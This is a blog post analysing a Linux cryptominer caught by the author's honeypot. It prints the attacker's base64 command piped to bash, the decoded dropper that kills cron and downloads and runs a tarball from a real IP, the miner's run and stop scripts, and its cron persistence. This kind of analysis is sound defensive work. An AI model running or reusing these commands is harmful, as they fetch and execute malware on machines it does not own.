---
layout: post
title:  "Honey Pot caught linux miner"
by:     "Michael Meade"
---

### What the cat brought home

I was looking at my honey pot this morning and I saw a what looked like base64 strings. A lot of time attackers like base64 because it makes it easy for them to bypass detection or even becuase it can ensure that
the string is still the same when ran. The attacker used the login, root/jinsheng to gain access to the honey pot. The Ip address used was: ```54.37.136.183```
In figure 1, we can see the actually command that the attacker used. 
```ruby 
cd /var/tmp; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw\">.threatstackcloudsecops; base64 --decode .threatstackcloudsecops | bash
```
Figure 1: the command used to download the malware.
As seen in Figure 1, the attacker first changed the directory to ```/var/tmp````. After changing the directory the base64 encoded string is decoded and than run. In Figure 2, we can see the
decoded base64 string.

```ruby
#!/bin/bash
cd /tmp
rm -rf .X15-unix
mkdir .X15-unix
cd .X15-unix
pkill -9 cron > .out
wget -q http://54.37.70.249/dota2.tar.gz || curl -O -f http://54.37.70.249/dota2.tar.gz
sleep 7s && tar xf dota2.tar.gz
#rm -rf dota2.tar.gz
cd .rsync
chmod 777 *
cd /tmp/.X15-unix/.rsync/a && ./cron || ./anacron
exit 0
```
Figure 2: the decoded base64 string
As seen in figure 2, the base64 removes the directory ```.X15-unix``` and then creates a new directory named the same thing.
After it creates a new directory the script changes to the newly created directory and also kills the cron process.
Next the the attacker downloads a .tar.gz file from ```http://54.37.70.249/dota2.tar.gz```. 
The script will than change directories to the .rsync and give the all the files in the dirctories permissions, after that it will run the
files ```a``` and ```cron```.


### A Look into the files dropped

In Figure 3, we can see that there is a bunch of folders and files inside the .tz. The attackers used
![Octocat](https://i.imgur.com/jmoC3qM.png=100x20)
Figure 3: the untar-ed contents of ```dota2.tar.gz```

In Figure 4,  we take a peak inside the file at ```a/run``` we can see that its a bash script that job is to check what arch the host machine is using and then runs the correct file. 
```ruby
#!/bin/bash
./stop
sleep 10
pwd > dir.dir
dir=$(cat dir.dir)
ARCH=`uname -m`
	if [ "$ARCH" == "i686" ]; then
		nohup ./anacron >>/dev/null & 
	elif [ "$ARCH" == "x86_64" ];   then
		./cron || ./anacron
	fi
echo $! > bash.pid
```
Figure 4: the contents of ```a/run```

In Figure 3, we can see that the ```a/run``` file runs a file called ```./stop```. In Figure 5, we can see that its job is kill any running proccesss called cron. The stop script also removes the file named ```.proc```.

```ruby#!/bin/sh
pkill -9 cron
killall -9 cron
kill -9 `ps x|grep cron|grep -v grep|awk '{print $1}'`>.proc
rm -rf .proc
```
Figure 5: the contents of ```a/stop```.


The ```a/``` is too big to share the source code. But In Figure 7, I posted the a pastebin.com of the source code. It looks like someone compiled a bash script of other miners IOC's and created a single script removing all the other miners. The code removes all the directories and kills all the processes. 
```ruby 
https://pastebin.com/raw/yxgk4PAi
```
Figure 7: The ```a/init0``` script




In Figure 8, is the cronjob that the miner created to try to stay on the infected machine as long as possible.

![crontab](https://i.imgur.com/8fSONkN.png=100x20)
Figure 8, cronjobs the malware created<br>

The cronjob will re-infect the machine on reboot. According to the cronjob it will also reinfect the machine every 3 days.<br> 
It will also run the script ```b/sync``` at the 8:05. <br>
